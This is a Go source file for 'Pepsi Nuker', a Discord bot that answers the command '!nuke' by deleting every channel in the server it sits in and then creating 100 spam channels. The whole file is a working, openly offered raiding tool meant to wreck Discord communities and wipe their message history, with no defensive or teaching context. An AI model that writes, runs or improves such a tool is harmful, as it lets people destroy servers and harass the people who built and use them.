package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	content := m.Content
	channels, _ := s.GuildChannels(m.GuildID)

	if !strings.HasPrefix(content, "!") {
		return
	}
	cmd := content[1:]
	switch strings.ToLower(cmd) {
	case "nuke":
		for _, chn := range channels {
			CoolPrint(fmt.Sprintf("Deleting %s[%s %s %s]%s", GRAY, END, chn.Name, GRAY, END), "+")
			go s.ChannelDelete(chn.ID)
		}
		for i := 0; i < 100; i++ {
			CoolPrint(fmt.Sprintf("Creating Channel #%d", i), "+")
			s.GuildChannelCreate(m.GuildID, "pepsi nuker runs cord", discordgo.ChannelTypeGuildText)
		}
	}
}

const (
	BLUE = "\001\033[0;38;5;12m\002"
	GRAY = "\033[90m"
	END  = "\001\033[0m\002"
)

func CoolPrint(con, prefix string) {
	res := fmt.Sprintf("%s[%s%s%s%s%s]%s %s", GRAY, END, BLUE, prefix, END, GRAY, END, con)
	fmt.Println(res)
}
func run(token string) {
	CoolPrint("Starting Pepsi Nuker ...", "*")
	nuker, bot_err := discordgo.New(fmt.Sprintf("Bot %s", token))
	if bot_err != nil {
		CoolPrint("Error Starting Pepsi Nuker...", "-")
		return
	}
	nuker.AddHandler(messageCreate)
	conn_err := nuker.Open()
	if conn_err != nil {
		CoolPrint("Error Opening Connection To Discord...", "-")
		return
	}
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
	CoolPrint("Stopping Pepsi Nuker ...", "-")
	nuker.Close()
}

func main() {
	token := flag.String("token", "", "The Token For Pepsi Nuker")
	flag.Parse()
	run(*token)

}
